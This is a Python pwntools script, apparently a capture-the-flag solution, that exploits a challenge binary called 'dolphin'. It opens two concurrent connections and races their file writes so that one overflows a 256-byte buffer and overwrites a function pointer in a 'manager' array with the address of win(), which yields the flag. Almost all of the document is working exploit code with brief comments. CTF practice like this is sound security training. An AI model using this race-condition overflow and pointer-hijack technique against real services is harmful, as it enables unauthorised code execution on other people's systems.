from pwn import *

# win address: 0x401bb7
# manager address: 0x4eb100

def get_token(c) :
    c.recvuntil(b'token: ')
    return c.recvline().strip()

exe = './dolphin'
COMMANDS = '''
b write_file
b 223
c
'''

# Usual challenge-and-response procedure for remote or creation of a process or debugger in local
if args.REMOTE:
    c_token = remote('dolphin.ctf.offensivedefensive.it', 8080, ssl = True)
    token = get_token(c_token)
    c_token.close()
    print(token)
    host = 'private.ctf.offensivedefensive.it'
    port = 8080
    ssl = True
else:
    if args.GDB:
        serv = gdb.debug(exe, gdbscript=COMMANDS)
    else:
        serv = process(exe)

    serv.recvuntil(b'Listening')
    serv.recvline()
    host = '0.0.0.0'
    port = 4000
    ssl = False

c1 = remote(host, port, ssl=ssl)
c2 = remote(host, port, ssl=ssl)

if args.REMOTE:
    c1.recvuntil(b'Token: ')
    c1.sendline(token)
    c2.recvuntil(b"Token: ")
    c2.sendline(token)

# Plan: while a thread writes on the buffer, another one changes the amount to make the first one go on writing in the buffer. The goal is to overflow on the next element of manager (containing the address of the function create_file) and overwrite its first field to make it point to win().

# preparing exploit parts in advance to avoid pythonn slowness
filename = b'hustle'
first_part = b'A'*250       # almost filling the buffer (it's 0x100=256 Bytes long)
second_part = b'B'*12 + b'\xb7\x1b'     # overflowing on the next element of manager
length1 = b'250'
length2 = b'14'

# creating a file to have something to write on
c1.recvuntil(b'> ')
c1.sendline(b'3')
c1.recvuntil(b'name: ')
c1.sendline(filename)
print(c1.recvline(keepends=False).decode)

# starting to write file with first thread
c1.recvuntil(b'> ')
c1.sendline(b'2')
c1.recvuntil(b'name: ')
c1.sendline(filename)
c1.recvuntil(b'length: ')
c1.sendline(length1)
c1.recvuntil(b'write: ')

# starting to write file with second thread
c2.recvuntil(b'> ')
c2.sendline(b'2')
c2.recvuntil(b'name: ')
c2.sendline(filename)
c2.recvuntil(b'length: ')
c2.sendline(length2)
c2.recvuntil(b'write: ')

# run threads, run!
c1.send(first_part)
c2.send(second_part)
print(c2.recvline().decode())   # debug

# making the program call create_file => win
c1.recvuntil(b'> ')
c1.sendline(b'3')
res = c1.recvline(keepends=False, timeout=0.5).decode()
print('res = ' + res)       # debug

# gracefully getting the flag and printing it
if 'Santa Claus' in res:
    c1.recvline()
    c1.recvline()
    c1.recvline()
    print(c1.recvline(keepends=False).decode().split('I\'m')[0])
else:
    print('Lost the race :(')   # debug
